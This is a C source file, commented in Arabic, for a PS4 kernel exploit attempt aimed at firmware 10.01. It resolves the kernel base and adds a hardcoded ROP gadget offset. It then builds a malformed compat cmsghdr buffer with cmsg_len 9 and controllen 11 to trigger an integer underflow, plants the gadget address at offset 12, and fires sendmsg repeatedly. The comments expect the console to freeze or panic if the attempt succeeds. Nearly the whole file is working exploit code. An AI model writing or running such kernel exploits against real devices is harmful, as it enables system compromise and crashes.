#define DEBUG_SOCKET
#define DEBUG_IP "192.168.100.16"
#define DEBUG_PORT 9023

#include <ps4.h>
#include <stdint.h>
#include <string.h>

// --- الإزاحات (Offsets) لنسخة 10.01 ---
#define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 

// تعريف الهياكل المتوافقة مع 32-بت (Compat) لضمان مطابقة freebsd32_misc.c
struct cmsghdr32 {
    uint32_t cmsg_len;   
    int      cmsg_level; 
    int      cmsg_type;  
};

struct msghdr32 {
    uint32_t msg_name;
    uint32_t msg_namelen;
    uint32_t msg_iov;
    uint32_t msg_iovlen;
    uint32_t msg_control;
    uint32_t msg_controllen;
    int      msg_flags;
};

#define CONTROL_LEN 256
uint8_t control_buf[CONTROL_LEN];

int _main(struct thread *td) {
    UNUSED(td);

    // 1. التهيئة الأولية
    initKernel();
    initLibc();

#ifdef DEBUG_SOCKET
    initNetwork();
    DEBUG_SOCK = SckConnect(DEBUG_IP, DEBUG_PORT);
    printf_debug("--- [PS4 Alignment Bug Test] ---\n");
#endif

    // جلب قاعدة النواة وحساب عنوان الـ Gadget
    uint64_t kbase = get_kernel_base();
    uint64_t trigger_gadget = kbase + OFF_PUSH_RSP_POP_RSI_RET;

#ifdef DEBUG_SOCKET
    printf_debug("[+] Kernel Base: 0x%llx\n", kbase);
    printf_debug("[+] Trigger Gadget: 0x%llx\n", trigger_gadget);
#endif

    // 2. إنشاء Socket UDP
    int sock = syscall(97, 2, 2, 0); 
    if (sock < 0) {
#ifdef DEBUG_SOCKET
        printf_debug("[-] Error: Failed to create socket.\n");
#endif
        return -1;
    }

    // 3. تجهيز الـ Buffer لاستغلال ثغرة الـ Alignment
    memset(control_buf, 0, CONTROL_LEN);

    struct cmsghdr32 *cmsg = (struct cmsghdr32 *)control_buf;
    
    /* المنطق: msg_controllen = 11 و cmsg_len = 9
       النواة ستقوم بـ copyout لـ 9 بايت، ثم تحسب القفزة التالية:
       next = 11 - ALIGN(9) => 11 - 12 = -1 (Integer Underflow)
    */
    cmsg->cmsg_len = 9; 
    cmsg->cmsg_level = 0; 
    cmsg->cmsg_type = 7; 

    // وضع الـ Gadget عند الإزاحة 12 (بداية الرسالة الوهمية الثانية بعد الـ Align)
    *(uint64_t *)(control_buf + 12) = trigger_gadget;

#ifdef DEBUG_SOCKET
    printf_debug("[+] Buffer prepared. Offset 12 set to: 0x%llx\n", trigger_gadget);
#endif

    // 4. إعداد ترويسة الرسالة مع القيمة "11" الحرجة
    struct msghdr32 msg = {0};
    msg.msg_control = (uintptr_t)control_buf;
    msg.msg_controllen = 11; 

#ifdef DEBUG_SOCKET
    printf_debug("[!] Sending syscall 28 (sendmsg) with controllen=11...\n");
#endif

    // 5. تنفيذ الاستدعاء (الطلقة الواحدة)
    // ملاحظة: إذا نجح الاستغلال، سيتجمد الجهاز هنا ولن تصل الرسالة التالية
    int res = syscall(28, sock, &msg, 0);
    int res1 = syscall(28, sock, &msg, 0);
    int res2 = syscall(28, sock, &msg, 0);
    int res3 = syscall(28, sock, &msg, 0);
    int res4 = syscall(28, sock, &msg, 0);
    int res5 = syscall(28, sock, &msg, 0);

#ifdef DEBUG_SOCKET
    printf_debug("[+] Syscall returned: %d\n", res);
    if (res == 0) {
        printf_debug("[?] No panic? Logic might be patched or needs alignment adjustment.\n");
    }
    printf_debug("--- [Test Finished] ---\n");
    SckClose(DEBUG_SOCK);
#endif

    // تنظيف
    syscall(6, sock);

    return 0;
}
